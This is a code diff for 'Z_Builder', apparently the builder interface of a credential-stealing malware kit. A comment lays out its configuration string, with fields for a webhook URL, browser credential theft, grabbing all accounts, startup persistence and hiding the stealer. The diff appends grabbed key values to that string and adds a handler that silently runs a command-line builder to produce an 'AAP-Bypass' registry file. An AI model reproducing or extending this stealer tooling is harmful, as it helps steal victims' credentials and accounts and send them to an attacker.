@@ -97,7 +97,7 @@ namespace Z_Builder
                 }
             }
             try { File.Delete(path); } catch { }
-            //[ID]==[WebHook_URL]==[Path]==[AAPData]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]--[BrowserCreds:(Y/N)]==[Title]==[Message]==
+            //[ID]==[WebHook_URL]==[Path]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]--[BrowserCreds:(Y/N)]==[Title]==[Message]==[AAPData]
             string command = "";
             command += "[" + metroTextBox5.Text + "]==[" + path + "]==";
             if (metroCheckBox9.Checked == true)
@@ -173,6 +173,7 @@ namespace Z_Builder
             {
                 command += "[+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-]==[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-]==";
             }
+            command += "[" + Get5RND() + "]--[" + Get9RND() + "]--[" + grab5keys() + "]--[" + grab9keys() + "]==";
             try
             {
                 command = command.Replace(" ", "[SPACE]");
@@ -701,6 +702,31 @@ namespace Z_Builder
             {
             }
             return array;
+        }
+
+        private void metroButton11_Click(object sender, EventArgs e)
+        {
+            if (metroTextBox6.Text != "")
+            {
+                // [Reg string]==[Path]==
+                string RegString = metroTextBox6.Text;
+                string command = "[" + RegString + "]==[";
+                string Path = Directory.GetCurrentDirectory() + "\\AAP-Bypass.reg";
+                command += Path + "]==";
+                command = command.Replace(" ", "[SPACE]");
+                Process p = new Process();
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "cmd /c Z-BuilderCL.exe " + command;
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
+                p.Start();
+                p.WaitForExit();
+                MessageBox.Show("Reg file created!");
+            }
+            else
+            {
+                MessageBox.Show("Input registry string");
+            }
         }
     }
 }
